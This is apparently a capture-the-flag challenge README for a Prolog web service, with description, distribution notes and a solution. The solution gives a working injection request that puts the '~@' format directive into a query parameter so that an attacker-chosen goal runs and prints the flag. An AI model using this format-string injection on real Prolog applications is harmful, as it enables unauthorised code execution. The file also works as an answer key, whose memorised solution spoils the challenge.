# Pwning en Logique
**Category:** Web
**Difficulty:** Medium
**Author:** lodsb

## Description

`solved_pwnlog(X) :- '1337haxor'(X).`

## Distribution

- `pwning_en_logique.tar.gz` (put `Dockerfile` and `server.pl` with flag replaced by a fake flag into a tar archive)
- challenge instancer (the vulnerability makes it easy to just disable the web application, so every team should have its own instance)

## Solution

Log in as either user (guest or AzureDiamond) and make a request to `/greet?format=~@~i&greeting=print_flag`. (`~@` in format interprets the argument as a goal to execute and `~i` just ignores the argument)
